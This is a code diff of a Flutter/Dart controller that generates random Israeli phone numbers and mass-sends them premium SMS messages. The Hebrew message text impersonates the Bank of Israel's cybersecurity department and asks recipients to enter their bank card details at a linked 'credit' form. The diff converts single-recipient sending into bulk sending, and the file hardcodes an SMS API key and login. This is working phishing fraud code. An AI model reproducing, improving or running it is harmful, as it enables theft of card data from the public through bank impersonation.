@@ -14,23 +14,17 @@ class SMSController extends GetxController {
       'e6ylxVvJmNojdIORcGZEa3nDrP5UHCw9'; // Replace with your actual API key
   final String apiLogin =
       'smswithlink@gmail.com'; // Replace with your actual API login
-  // Create an RxString to hold the generated phone number
-  // final generatedPhoneNumber = ''.obs;
-  // array will contain a generated phone numbers
-  final generatedPhoneNumbers = <String>[].obs;
+
+  final RxList<String> generatedPhoneNumbers = <String>[].obs;
   final amountController = TextEditingController().obs;
 
-  // Method to generate the phone number and update the RxString
-  generatePhoneNumber() async {
+   generatePhoneNumber() async {
     print('generate method enter ');
-    // Generate a random phone number
-    // print the controller text value after each step
-    print("amoiunt =  ${amountController.value.text}" ?? '0');
+      print("amoiunt =  ${amountController.value.text}" ?? '0');
     if (amountController.value.text == '' ||
         amountController.value.text == '0') {
       generatedPhoneNumbers.clear();
-      // show alert that told the user should enter amount of phone numbers
-      const SnackBar(
+       const SnackBar(
         duration: Duration(seconds: 3),
         dismissDirection: DismissDirection.startToEnd,
         shape: BeveledRectangleBorder(),
@@ -38,29 +32,23 @@ class SMSController extends GetxController {
         content: Text(
             'You should have a list of phone numbers, /n Please enter the amount of phone numbers you want to generate'),
       );
-      // Get.snackbar(
-      //   'Error',
-      //   'Please enter amount of phone numbers',
-      //   duration: Duration(seconds: 4),
-      //   backgroundColor: Colors.red,
-      //   colorText: Colors.white,
-      //   snackPosition: SnackPosition.BOTTOM,
-      // );
-    } else {
-      // loop the amount of numbers and add to the array
-      // check if the amount is 1 or more
+
+    }
+    else
+    {
       for (int i = 0;
           i <
               int.parse(
                 amountController.value.text,
               );
           i++) {
-        generatedPhoneNumbers.add(generateIsraelPhoneNumber());
+        var temp = generateIsraelPhoneNumber();
+        generatedPhoneNumbers.add(temp);
+        print('phoen number in generrrrr  = $temp');
+
       }
     }
-    // String phoneNumber = await generateRandomIsraeliPhoneNumber();
-    // generatedPhoneNumber.value = phoneNumber;
-  }
+   }
 
 // Generate a unique link or use your own link to the card information form
   String? uniqueLink = 'https://smswithlink-credit.netlify.app';
@@ -89,14 +77,28 @@ class SMSController extends GetxController {
   }
 
   Future<void> sendSMS(String phoneNumber, String param1) async {
+
+    final listOfRes=[];
+      for (int i =0 ; i< generatedPhoneNumbers.value.length ; i++){
+
+    listOfRes.add(
+      {
+        "phone_number": generatedPhoneNumbers.value.elementAt(i),
+        "param1":param1
+      }
+    );
+
+      }
+
     try {
       final Map<String, dynamic> data = {
-        "recipients": [
-          {
-            "phone_number": phoneNumber,
-            "param1": param1,
-          }
-        ],
+        "recipients": listOfRes,
+        // [
+        //   {
+        //     "phone_number": phoneNumber,
+        //     "param1": param1,
+        //   }
+        // ],
         "text":
             "אנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל. אנא מלא את פרטי כרטיס הבנק שלך כדי לוודא שאתה בעל הכרטיס הלגיטימי עקב הפצת הונאה והודעות מזויפות.:\n $uniqueLink",
         "type": "sms_premium",
@@ -130,43 +132,5 @@ class SMSController extends GetxController {
       print('Error sending SMS: $e');
     }
   }
-  // Future<void> sendSMS(String phoneNumber, String param1) async {
-  //   try {
-  //     final response = await http.post(
-  //       Uri.parse(baseUrl),
-  //       headers: {
-  //         'Content-Type': 'application/json',
-  //         'api-key': apiKey,
-  //         'api-login': apiLogin,
-  //         'cache-control': 'no-cache',
-  //       },
-  //       body: '''
-  //         {
-  //           "recipients": [
-  //             {
-  //               "phone_number": "$phoneNumber",
-  //               "param1": "$param1"
-  //             }
-  //           ],
-  //           "text":"אנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל. אנא מלא את פרטי כרטיס הבנק שלך כדי לוודא שאתה בעל הכרטיס הלגיטימי עקב הפצת הונאה והודעות מזויפות.:\n $uniqueLink",
 
-  //           "type": "sms_premium",
-  //           "purpose": "wholesale",
-  //           "sender": "BOI h"
-  //         }
-  //       ''',
-  //     );
-
-  //     if (response.statusCode == 200) {
-  //       // SMS sent successfully
-  //       print('SMS sent successfully');
-  //     } else {
-  //       // Handle error
-  //       print('Error sending SMS: ${response.body}');
-  //     }
-  //   } catch (e) {
-  //     // Handle error
-  //     print('Error sending SMS: $e');
-  //   }
-  // }
 }
